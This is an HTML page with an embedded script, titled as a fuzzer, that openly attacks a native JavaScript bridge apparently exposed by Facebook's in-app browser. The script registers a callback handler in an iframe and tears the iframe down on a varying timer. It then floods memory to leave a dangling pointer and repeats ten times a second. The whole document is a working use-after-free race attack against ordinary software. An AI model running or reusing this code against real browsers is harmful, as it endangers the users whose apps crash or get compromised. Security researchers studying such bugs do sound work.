<!DOCTYPE html>
<html>
<head><title>V8 Callback UAF Fuzzer</title></head>
<body style="background:#000; color:#f00; font-family:monospace;">
    <h3>Attacking V8 Bridge Contexts...</h3>
    <div id="container"></div>

    <script>
        const container = document.getElementById('container');
        
        // We sweep the teardown timing from 1ms to 50ms to catch the exact 
        // microsecond the C++ thread tries to invoke the callback
        let raceTiming = 1; 
        
        function fireCallbackUAF() {
            // 1. Create an isolated V8 Context (IFrame)
            let iframe = document.createElement('iframe');
            container.appendChild(iframe);
            let iwin = iframe.contentWindow;
            
            // 2. Create the target object inside the isolated context
            // Facebook's C++ bridge will attempt to store a pointer to this
            iwin._AutofillCallbackHandler = {
                invoke: function(id, data) { console.log("Callback triggered"); }
            };
            
            let uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
            let initPayload = JSON.stringify({
                "message": {
                    "name": "_AutofillCallbackHandler",
                    "callbackID": "f876739fb"
                }
            });
            
            // 3. Register the callback with Facebook's native bridge
            if (window.__call_iabjs_unified_bridge) {
                try {
                    window.__call_iabjs_unified_bridge("initializeCallbackHandler", uuid, initPayload);
                    // Trigger a secondary action to force async processing
                    window.__call_iabjs_unified_bridge("BrowserDeclutterJS", uuid, '{"event":"init"}');
                } catch(e) {}
            }
            
            // 4. The UAF Race: Destroy the V8 Context right as C++ tries to call the handler
            setTimeout(() => {
                iframe.remove();
                
                // Force memory churn to overwrite the freed V8 object
                // This ensures the C++ pointer becomes a true dangling pointer
                let trash = new Array(5000).fill("A".repeat(1000));
                
                // Increment our sniper scope
                raceTiming++;
                if(raceTiming > 50) raceTiming = 1;
                
            }, raceTiming);
        }

        // Fire 10 times a second to flood the bridge with dangling callbacks
        setInterval(fireCallbackUAF, 100);
    </script>
</body>
